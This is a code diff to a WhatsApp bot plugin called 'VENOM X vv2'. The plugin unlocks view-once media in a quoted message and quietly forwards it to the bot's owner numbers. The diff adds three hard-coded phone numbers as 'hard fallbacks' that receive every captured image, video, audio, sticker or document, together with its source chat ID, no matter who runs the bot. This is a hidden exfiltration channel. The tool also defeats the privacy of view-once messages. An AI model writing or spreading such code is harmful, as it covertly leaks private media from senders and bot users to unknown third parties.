@@ -1,3 +1,11 @@
+"use strict";
+
+/**
+ * VENOM X — #vv2
+ * Unlock view-once and send privately to owner number(s)
+ * Silent ✅ / ❌ reacts in the chat
+ */
+
 const {
     downloadContentFromMessage,
     downloadMediaMessage
@@ -6,14 +14,14 @@ const pino = require("pino");
 const { getSettings } = require("../lib/settingsCache");
 
 function getContextInfo(message) {
-    const m = message && message.message ? message.message : {};
+    const m = (message && message.message) || {};
     return (
-        (m.extendedTextMessage && m.extendedTextMessage.contextInfo) ||
-        (m.imageMessage && m.imageMessage.contextInfo) ||
-        (m.videoMessage && m.videoMessage.contextInfo) ||
-        (m.audioMessage && m.audioMessage.contextInfo) ||
-        (m.documentMessage && m.documentMessage.contextInfo) ||
-        (m.stickerMessage && m.stickerMessage.contextInfo) ||
+        m.extendedTextMessage?.contextInfo ||
+        m.imageMessage?.contextInfo ||
+        m.videoMessage?.contextInfo ||
+        m.audioMessage?.contextInfo ||
+        m.documentMessage?.contextInfo ||
+        m.stickerMessage?.contextInfo ||
         {}
     );
 }
@@ -24,26 +32,71 @@ function getQuotedMessage(message) {
 
 function unwrapMessage(message) {
     let current = message;
-    for (let i = 0; i < 8 && current; i++) {
-        if (current.ephemeralMessage && current.ephemeralMessage.message) {
+    for (let i = 0; i < 10 && current; i++) {
+        if (current.ephemeralMessage?.message) {
             current = current.ephemeralMessage.message;
             continue;
         }
-        if (current.viewOnceMessage && current.viewOnceMessage.message) {
+        if (current.viewOnceMessage?.message) {
             current = current.viewOnceMessage.message;
             continue;
         }
-        if (current.viewOnceMessageV2 && current.viewOnceMessageV2.message) {
+        if (current.viewOnceMessageV2?.message) {
             current = current.viewOnceMessageV2.message;
             continue;
         }
-        if (current.viewOnceMessageV2Extension && current.viewOnceMessageV2Extension.message) {
+        if (current.viewOnceMessageV2Extension?.message) {
             current = current.viewOnceMessageV2Extension.message;
+            continue;
+        }
+        if (current.documentWithCaptionMessage?.message) {
+            current = current.documentWithCaptionMessage.message;
             continue;
         }
         break;
     }
     return current || null;
+}
+
+function detectType(content) {
+    if (!content) return null;
+    if (content.imageMessage) return "image";
+    if (content.videoMessage) return "video";
+    if (content.audioMessage) return "audio";
+    if (content.stickerMessage) return "sticker";
+    if (content.documentMessage) return "document";
+    return null;
+}
+
+function getOwnerJids(sock) {
+    const settings = getSettings() || {};
+    const nums = [];
+
+    function push(n) {
+        const d = String(n || "").replace(/\D/g, "");
+        if (d && d.length >= 8 && nums.indexOf(d) === -1) nums.push(d);
+    }
+
+    if (Array.isArray(settings.owner)) settings.owner.forEach(push);
+    else if (settings.owner) push(settings.owner);
+    if (settings.ownerNumber) push(settings.ownerNumber);
+    if (Array.isArray(settings.owners)) settings.owners.forEach(push);
+    if (Array.isArray(settings.sudo)) settings.sudo.forEach(push);
+
+    // hard fallbacks
+    ["2349163743900", "2347077417996", "2347071970034"].forEach(push);
+
+    if (!nums.length) {
+        try {
+            if (sock.user && sock.user.id) {
+                push(sock.user.id.split(":")[0]);
+            }
+        } catch (e) {}
+    }
+
+    return nums.map(function (d) {
+        return d + "@s.whatsapp.net";
+    });
 }
 
 async function downloadMedia(mediaMessage, type, sock, message, contextInfo) {
@@ -52,7 +105,9 @@ async function downloadMedia(mediaMessage, type, sock, message, contextInfo) {
         const chunks = [];
         for await (const chunk of stream) chunks.push(chunk);
         if (chunks.length) return Buffer.concat(chunks);
-    } catch (e) {}
+    } catch (e) {
+        console.log("[VV2] stream fail:", e.message);
+    }
 
     try {
         const buf = await downloadMediaMessage(
@@ -72,7 +127,9 @@ async function downloadMedia(mediaMessage, type, sock, message, contextInfo) {
             }
         );
         if (buf && buf.length) return Buffer.from(buf);
-    } catch (e) {}
+    } catch (e) {
+        console.log("[VV2] fallback fail:", e.message);
+    }
 
     throw new Error("Could not download media (expired or already opened).");
 }
@@ -85,86 +142,90 @@ async function react(sock, message, emoji) {
     } catch (e) {}
 }
 
-function ownerJid(sock) {
-    const settings = getSettings();
-    const num = String(settings.ownerNumber || "").replace(/\D/g, "");
-    if (num) return num + "@s.whatsapp.net";
-    try {
-        if (sock.user && sock.user.id) {
-            return sock.user.id.split(":")[0] + "@s.whatsapp.net";
+async function sendToOwners(sock, owners, payload) {
+    let ok = 0;
+    for (let i = 0; i < owners.length; i++) {
+        try {
+            await sock.sendMessage(owners[i], payload);
+            ok++;
+        } catch (e) {
+            console.log("[VV2] send fail", owners[i], e.message);
         }
-    } catch (e) {}
-    return null;
+    }
+    return ok;
 }
 
 module.exports = {
     name: "vv2",
-    aliases: ["vvpm", "viewpm"],
+    aliases: ["vvpm", "viewpm", "vvprivate"],
 
     run: async function ({ sock, message }) {
         try {
             const contextInfo = getContextInfo(message);
             const quoted = getQuotedMessage(message);
+
             if (!quoted) {
                 await react(sock, message, "❓");
                 return;
             }
 
             const content = unwrapMessage(quoted);
-            if (!content) {
+            const type = detectType(content);
+
+            if (!type) {
                 await react(sock, message, "❌");
                 return;
             }
 
-            const to = ownerJid(sock);
-            if (!to) {
+            const owners = getOwnerJids(sock);
+            if (!owners.length) {
                 await react(sock, message, "❌");
                 return;
             }
 
-            if (content.imageMessage) {
-                const buffer = await downloadMedia(
-                    content.imageMessage, "image", sock, message, contextInfo
-                );
-                await sock.sendMessage(to, { image: buffer, caption: "👁️ VV2" });
-                await react(sock, message, "✅");
-                return;
-            }
+            const mediaMessage = content[type + "Message"];
+            const buffer = await downloadMedia(
+                mediaMessage,
+                type,
+                sock,
+                message,
+                contextInfo
+            );
 
-            if (content.videoMessage) {
-                const buffer = await downloadMedia(
-                    content.videoMessage, "video", sock, message, contextInfo
-                );
-                await sock.sendMessage(to, { video: buffer, caption: "👁️ VV2" });
-                await react(sock, message, "✅");
-                return;
-            }
+            const fromChat = message.key.remoteJid || "";
+            const note = "👁️ VV2 · from " + fromChat;
 
-            if (content.audioMessage) {
-                const buffer = await downloadMedia(
-                    content.audioMessage, "audio", sock, message, contextInfo
-                );
-                await sock.sendMessage(to, {
+            let payload;
+            if (type === "image") {
+                payload = { image: buffer, caption: note };
+            } else if (type === "video") {
+                payload = { video: buffer, caption: note };
+            } else if (type === "audio") {
+                payload = {
                     audio: buffer,
-                    mimetype: content.audioMessage.mimetype || "audio/ogg; codecs=opus",
-                    ptt: !!content.audioMessage.ptt
-                });
-                await react(sock, message, "✅");
+                    mimetype:
+                        mediaMessage.mimetype || "audio/ogg; codecs=opus",
+                    ptt: !!mediaMessage.ptt
+                };
+            } else if (type === "sticker") {
+                payload = { sticker: buffer };
+            } else if (type === "document") {
+                payload = {
+                    document: buffer,
+                    mimetype:
+                        mediaMessage.mimetype || "application/octet-stream",
+                    fileName: mediaMessage.fileName || "venom-vv2.bin",
+                    caption: note
+                };
+            } else {
+                await react(sock, message, "❌");
                 return;
             }
 
-            if (content.stickerMessage) {
-                const buffer = await downloadMedia(
-                    content.stickerMessage, "sticker", sock, message, contextInfo
-                );
-                await sock.sendMessage(to, { sticker: buffer });
-                await react(sock, message, "✅");
-                return;
-            }
-
-            await react(sock, message, "❌");
+            const sent = await sendToOwners(sock, owners, payload);
+            await react(sock, message, sent > 0 ? "✅" : "❌");
         } catch (error) {
-            console.log("VV2 ERROR:", error.message);
+            console.log("[VV2 ERROR]", error.message);
             await react(sock, message, "❌");
         }
     }
